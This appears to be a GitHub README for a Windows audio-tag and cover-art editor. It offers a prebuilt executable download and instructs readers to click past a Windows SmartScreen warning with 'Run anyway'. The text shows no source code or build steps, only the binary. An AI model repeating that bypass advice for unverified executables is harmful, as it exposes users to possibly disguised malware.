<p align="center">
  <img src="https://i.postimg.cc/tgfWtxdp/banner.png" alt="MP3Tag Studio — Batch Audio Metadata, Track Numbering & Cover Art Editor for Windows" width="100%">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64-0078D6?style=flat-square&logo=windows" alt="Platform: Windows 10/11 x64">
  <img src="https://img.shields.io/badge/Mode-Audio%20Tags%20%26%20Covers-2EA44F?style=flat-square" alt="Mode">
  <img src="https://img.shields.io/badge/Release-mp3tag--studio--v1.3-5391FE?style=flat-square" alt="Release Tag">
  <img src="https://img.shields.io/badge/License-MIT-8B5CF6?style=flat-square" alt="License: MIT">
</p>

# MP3Tag Studio — Batch Audio Metadata, Track Numbering & Cover Art Editor for Windows

**Music library full of 'Track 01 - Unknown Artist' files with missing album covers on your phone, car stereo, or Plex server? Batch-edit ID3v2, FLAC, OGG, and M4A tags, embed high-res cover art, and auto-parse tags from filenames in seconds.**

MP3Tag Studio makes organizing local music and audiobook collections effortless on Windows: **editing Artist, Album, Year, Genre, and Track Numbers across entire folders at once, embedding `cover.jpg` / `folder.png` directly into audio headers, and converting between filenames and metadata tags**.

This project is aimed at **Windows 10 and Windows 11 (64-bit) music collectors, podcasters, and DJs** organizing local `.mp3`, `.flac`, `.ogg`, `.opus`, and `.m4a` libraries offline.

## Quick Use-Case & Troubleshooting Reference

| Scenario / Issue | Cause | Solution |
| --- | --- | --- |
| Car stereo or phone player shows 'Unknown Album' / no cover art | Downloaded tracks lack embedded ID3v2 / Vorbis front-cover art | Select all album tracks and embed `cover.jpg` in one click |
| Filenames look like `01 - Artist - Song.mp3` but tags are empty | Ripped or exported tracks have metadata only in the filename | Use **Filename → Tag** pattern (`%track% - %artist% - %title%`) |
| Tracks play out of order on USB drives or media players | Missing `Track 01/12` metadata or unpadded filenames | Run **Auto-Number Wizard** and rename files cleanly from tags |
| Need to clean messy website URLs from Comment/Album tags | Promo tracks contain spam links in ID3 comment fields | Clear or batch-replace tag fields across hundreds of files |

## Download for Windows

[**Download MP3TagStudio.zip — Latest GitHub Release (Windows x64)**](../../releases/latest/download/MP3TagStudio.zip)  
[View All Releases & Changelog](../../releases) · [Report an Issue](../../issues)

### Why use `MP3TagStudio.exe`? (Key features)

- Supports batch tag editing for `.mp3` (ID3v2.3/v2.4), `.flac`, `.ogg`, `.opus`, `.m4a`, and `.wav`.
- Embeds or extracts front-cover album artwork (`.jpg` / `.png`) across entire album folders.
- Two-way pattern engine: **Filename → Tag** and **Tag → Filename** (`%track% - %title%`).
- Built-in Auto-Numbering wizard (`01/12`, `02/12`) and case-normalization tools.

### Sample Output

```text
[MP3TagStudio] Loaded Album Folder: D:\Music\Synthwave_Anthology (12 files)
[OK]   Embedded Artwork : cover.jpg (1000x1000 JPEG -> 12/12 tracks)
[OK]   Updated Tags     : Album="Synthwave Anthology", Year=2026, Track=01..12
[OK]   Renamed Files    : %track% - %artist% - %title%.flac (12/12 completed)
```

The release ZIP is named `MP3TagStudio.zip`; the Windows executable inside is named `MP3TagStudio.exe`.

1. Close MP3Tag Studio before updating or replacing executable files.
2. Click **Download MP3TagStudio.zip** above.
3. Right-click the downloaded archive and choose **Extract All**.
4. Open the extracted folder and run `MP3TagStudio.exe`.
5. Review the options and output paths before processing files.

**Requirements:** Windows 10 or 11 (64-bit) with read/write access to your music folders.

### Verification & Windows SmartScreen Note

- **Offline & standard user permissions:** `MP3TagStudio.exe` runs locally without uploading your files and does not require disabling Windows Defender.
- **Windows SmartScreen:** Because this is an independent open-source utility without a commercial EV code-signing certificate, Windows SmartScreen may show *"Windows protected your PC"* on first launch. Click **More info → Run anyway** after verifying the release checksum on the [Releases](../../releases) page.

## Problems this project solves

### Fixing broken car-audio and mobile player sorting

Proper `Album Artist`, `Track Number`, and embedded `Front Cover` tags ensure every player displays albums properly.

### Extracting structured tags from messy filenames

Pattern parsing turns `03 - Band - Song.mp3` into clean metadata fields across hundreds of tracks.

### Uniform file naming across large music archives

Formatting filenames from verified tags keeps folders clean and searchable.

### 100% offline execution

Edits local audio file headers directly without internet lookups.

## Default folders and configuration paths

MP3Tag Studio edits metadata headers directly inside your selected music folders:

```text
%USERPROFILE%\Music\
```

Typical directory layout:

```text
Music\AlbumName\
├── cover.jpg
├── 01 - Artist - Opening.flac   (ID3/Vorbis tags + embedded cover)
└── 02 - Artist - Horizon.flac
```

Make a backup copy of rare lossless albums before running bulk filename or tag replacements.

## Quick start guide

Follow these steps to get started:

1. **Extract `MP3TagStudio.zip` and launch `MP3TagStudio.exe`.** No installation required.
2. **Drag an album folder or selection of `.mp3`/`.flac` files into the table.** Select all rows (`Ctrl+A`) to edit shared fields like Album, Artist, and Year.
3. **Drag `cover.jpg` onto the Artwork box and click **Save Tags**.** Embeds cover art into every selected track.
4. **Use **Tag → Filename** if you also want clean standardized filenames.** Preview new filenames before applying.

### Data safety note

Test pattern replacements on one album folder first to verify your formatting template.

## What the status summary shows

MP3Tag Studio displays **file count, tag format (ID3v2/Vorbis/MP4), embedded cover resolution, and updated file count**.

## FAQ

**Which audio formats are supported?**

MP3, FLAC, OGG, Opus, M4A/AAC, and WAV.

**Does embedding cover art reduce audio quality?**

No. Cover images and metadata tags are stored in the file header without touching the audio stream.

**Can I extract existing cover art from an MP3 or FLAC file?**

Yes—right-click the artwork preview and choose 'Export Cover Image'.

## Useful reading

- [ID3v2 Informal Standard Specification](https://id3.org/id3v2.4.0-frames)

## More Windows Desktop Utilities

- [SnapFormat-BatchMediaConverter](../SnapFormat-BatchMediaConverter) — Offline batch HEIC/WebP/MKV to JPG/PNG/MP4 converter
- [BulkRename-RegexFileRenamer](../BulkRename-RegexFileRenamer) — Windows batch file & photo renamer with live preview
- [DupeSweep-HashFileCleaner](../DupeSweep-HashFileCleaner) — Fast SHA-256 duplicate file & music library cleaner
- [SoundDeck-MicSoundboard](../SoundDeck-MicSoundboard) — Lightweight virtual-mic soundboard for Discord, OBS & voice chat

*Independent open-source desktop utility for Windows.*
